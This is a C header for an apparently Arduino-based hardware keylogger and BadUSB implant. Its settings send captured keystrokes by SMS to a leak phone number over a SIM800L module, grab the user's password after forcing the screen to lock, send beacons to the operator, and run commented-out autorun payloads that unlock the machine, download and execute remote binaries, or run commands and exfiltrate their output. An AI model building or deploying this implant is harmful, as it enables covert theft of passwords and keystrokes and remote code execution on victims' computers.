#pragma once

#include "C_USBhost.h"
#include <SoftwareSerial.h>

/*******************************************/
/******* START CONFIGURATION OPTIONS *******/
/*******************************************/
#define LEAK_PHONE_NUMBER "+34nnnnnn"		// Introduce the destination phone number with country code
#define IMPLANT_NAME "KeyVL1"	         			// Identify device when multiple used			
//#define BEACON true                         // Un-comment to send beacons every BEACON_TIME 
#define KEYLOGGER true                      // Un-comment to work also as keylogger (if commented, just work as badusb)
#define GETLANG true                        // Un-comment to try to get keyboard language
#define DEFLANG "en_US"                     // Default keyboard language to use, if not detected

//#define AUTORUN "UnlockDownload##lnx##PASSWORD##https://s3.amazonaws.com/testing/hello_lin"   // Autorun script to be run on connect
#ifndef AUTORUN
  #define GETPASS true               // Un-comment to be smart and try to get user password after lock
  //#define LOCKPC true                // Un-comment if you want to force lock when connecting to computer
#endif

#define DEBUG true                  // Un-comment if you want to build with DEBUG.
//#define DEBUGWITHOUTSIM true
// Use one of the following examples to debug without a SIM module and without an USB host
//#define DEBUGWITHOUTSIM_PAYLOAD "UnlockDownload##win##PASSWORD##https://s3.amazonaws.com/testing/hello.exe"
//#define DEBUGWITHOUTSIM_PAYLOAD "UnlockDownload##osx##PASSWORD##https://s3.amazonaws.com/testing/hello_osx"
//#define DEBUGWITHOUTSIM_PAYLOAD "UnlockDownload##lnx##PASSWORD##https://s3.amazonaws.com/testing/hello_lin"
//#define DEBUGWITHOUTSIM_PAYLOAD "UnlockRunAndExfil##win##PASSWORD##mkdir %TEMP%\\malware"
//#define DEBUGWITHOUTSIM_PAYLOAD "UnlockRunAndExfil##osx##PASSWORD##uname -a"
//#define DEBUGWITHOUTSIM_PAYLOAD "UnlockRunAndExfil##lnx##PASSWORD##touch /tmp/malware"
/*******************************************/
/******* END CONFIGURATION OPTIONS *********/
/*******************************************/


extern C_USBhost USBhost;
extern SoftwareSerial SMSSERIAL;
extern String os;

#define SEPARATOR "##"
#define SMS_CHAR_LIMIT 140
#define MAX_BUFFER_SIZE 1024
#define BAUD_RATE_SIM800L 57600                    
#define BAUD_RATE_USB_HOST_BOARD 115200             
#define BAUD_RATE_SERIAL 115200

#ifdef DEBUG
  #define BEACON_TIME 10 // Time in minutes we will send a beacon to let know the implant is alive
#else
  #define BEACON_TIME 60 // Time in minutes we will send a beacon to let know the implant is alive
#endif  
